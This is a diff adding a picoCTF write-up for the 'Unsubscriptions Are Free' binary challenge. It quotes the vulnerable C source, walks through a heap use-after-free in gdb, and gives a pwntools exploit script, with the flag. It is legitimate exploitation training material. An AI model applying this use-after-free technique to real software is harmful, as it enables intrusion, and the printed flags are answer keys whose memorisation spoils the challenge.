@@ -270,3 +270,158 @@ r.interactive()
 ```
 
 Flag: **picoCTF{1_<3_sm4sh_st4cking_  8652b55904cb7c}** (yes, two spaces before the hex part)
+
+## Unsubscriptions Are Free ![p](https://img.shields.io/badge/Points-100-success) ![c](https://img.shields.io/badge/Binary-darkred)
+
+We have access to a 32-bit binary and also to the source code, so we can easily read all instructions (I only left the relevant ones):
+```c
+typedef struct {
+	uintptr_t (*whatToDo)();
+	char *username;
+} cmd;
+
+char choice;
+cmd *user;
+
+void hahaexploitgobrrr(){
+ 	char buf[FLAG_BUFFER];
+ 	FILE *f = fopen("flag.txt","r");
+ 	fgets(buf,FLAG_BUFFER,f);
+ 	fprintf(stdout,"%s\n",buf);
+ 	fflush(stdout);
+}
+
+void doProcess(cmd* obj) {
+	(*obj->whatToDo)();
+}
+
+void s(){
+ 	printf("OOP! Memory leak...%p\n",hahaexploitgobrrr);
+ 	puts("Thanks for subsribing! I really recommend becoming a premium member!");
+}
+
+void leaveMessage(){
+	puts("I only read premium member messages but you can ");
+	puts("try anyways:");
+	char* msg = (char*)malloc(8);
+	read(0, msg, 8);
+}
+
+void i(){
+	char response;
+  	puts("You're leaving already(Y/N)?");
+	scanf(" %c", &response);
+	if(toupper(response)=='Y'){
+		puts("Bye!");
+		free(user);
+	}else{
+		puts("Ok. Get premium membership please!");
+	}
+}
+
+void processInput(){
+  scanf(" %c", &choice);
+  choice = toupper(choice);
+  switch(choice){
+	case 'S':
+	if(user){
+ 		user->whatToDo = (void*)s;
+	}else{
+		puts("Not logged in!");
+	}
+	break;
+	case 'P':
+	user->whatToDo = (void*)p;
+	break;
+	case 'I':
+ 	user->whatToDo = (void*)i;
+	break;
+	case 'M':
+ 	user->whatToDo = (void*)m;
+	puts("===========================");
+	puts("Registration: Welcome to Twixer!");
+	puts("Enter your username: ");
+	user->username = getsline();
+	break;
+   case 'L':
+	leaveMessage();
+	break;
+	case 'E':
+	exit(0);
+	default:
+	puts("Invalid option!");
+	exit(1);
+	  break;
+  }
+}
+
+int main(){
+	setbuf(stdout, NULL);
+	user = (cmd *)malloc(sizeof(user));
+	while(1){
+		printMenu();
+		processInput();
+		//if(user){
+			doProcess(user);
+		//}
+	}
+	return 0;
+}
+```
+
+What we can immediately see, also by running the binary, is that sometimes it will leak an address: if we search in the code we see that the address is the one of `hahaexploitgobrrr`: at first I thought they was trolling me, but I soon realized that this is the real function reading and printing the flag.
+
+Now let's search for allocations and deallocations of heap space: in `main` the space for `user` variable is allocated, and interestingly enough we see that a check `if(user)` is commented out.. let's search for a `free`! In function `i` we can find `free(user)`, but if we try to simulate this while running the program nothing changes: we can still access the user.
+
+Now run it on gdb and explore the memory:  
+We set a breakpoint at `0x8048d6f`, the instruction following the `malloc` of user, and observe `EAX = 0x804c160` being the address of this heap space, the return value of the malloc function.
+
+Now with `disassemble processInput` we can retrieve the (approximate) address of `i()`, `0x8048d2f`, by looking at the jumps performed in the assembly and the function calls performed in C. Set a breakpoint at this address and by continuing we arrive at the _"You're leaving already(Y/N)?"_ choice.  
+If we now look at the content of our user variable at 0x804c160 we can see the username we inserted (I did it before with the "M" choice). If we enter Y and we free the variable, with `tcache` we can now see that it's now in the deleted chunks cache.
+
+_Important_: sizeof(char*)
+
+By accessing 0x804c160 we can still see our values, now we need to search for another malloc function and.. `leaveMessage` does this, with `(char*)malloc(8);`. Luckily, or maybe not, this is the same size of the chunk we freed before, so this will be reused for optimization purposes.  
+I then tried to write random data onto this chunk through the following `read`, and by continuing the execution I triggered a SIGSEGV: **Invalid address 0x6c6f6964**. Perfect, it's what I wrote as message.
+
+But why is happening this? Just for clarity purposes, after exiting `processInput`, `doProcess` will be called: `(*obj->whatToDo)();` calls the pointer at offset 0.
+
+At this point we already know everything we need to exploit this, so we will:
+- (S) subscribe to get the memory leak
+- (I) unsubscribe to free the chunk
+- (L) leave a message containing the leaked address
+- get the flag
+
+```python
+from pwn import *
+
+menu_end = "(e)xit\n"
+choice = "You're leaving already(Y/N)?\n"
+mex = "try anyways:\n"
+
+r = remote("mercury.picoctf.net", 6312)
+
+log.info("Sending (S) subscription")
+
+r.sendlineafter(menu_end, b"S")
+r.recvuntil("leak...")
+flag_leaked_string = r.recv(9).decode("utf-8") 
+flag_leaked = int(flag_leaked_string, 16)
+log.success("LEAKED address: {}".format(hex(flag_leaked)))
+
+log.info("Sending (I) unsubscription")
+
+r.sendlineafter(menu_end, b"I")
+r.sendlineafter(choice, b"Y")
+
+
+payload = p32(flag_leaked) + p32(0)
+log.info("(L) leaving message".format(payload))
+
+r.sendlineafter(menu_end, b"L")
+r.sendlineafter(mex, payload)
+
+r.interactive()
+```
+
+Flag: **picoCTF{d0ubl3_j30p4rdy_ad77070e}**
